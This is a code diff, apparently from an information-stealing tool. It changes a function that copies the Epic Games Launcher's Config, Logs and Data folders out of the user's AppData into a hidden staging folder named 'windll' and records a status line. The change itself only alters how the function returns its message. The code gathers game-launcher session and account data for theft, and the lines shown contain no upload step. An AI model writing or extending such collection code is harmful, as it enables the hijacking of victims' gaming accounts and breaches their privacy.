@@ -19,15 +19,16 @@ path1 = r'EpicGamesLauncher\Saved\Logs'
 path2 = r'EpicGamesLauncher\Saved\Data'
 
 
-def Epic(data):
+def Epic():
     try:
+        msgInfo=""
         pathtofile = environ['USERPROFILE'] + sep + r'AppData\Local'
         user = environ['USERPROFILE'] + sep + r'AppData\Local'
         copytree(user+ sep + path,rf'{pathtofile}\windll\Games\EpicGames\Config')
         copytree(user+ sep + path1,rf'{pathtofile}\windll\Games\EpicGames\Logs')
         copytree(user+ sep + path2,rf'{pathtofile}\windll\Games\EpicGames\Data')
-        data.append("\n∟🎮EpicGames")
-        return data
+        msgInfo+="\n∟🎮EpicGames"
+        return msgInfo
     except Exception as error:
         Log(f"EpicGames ---> {error}")
-        return data
+        return msgInfo
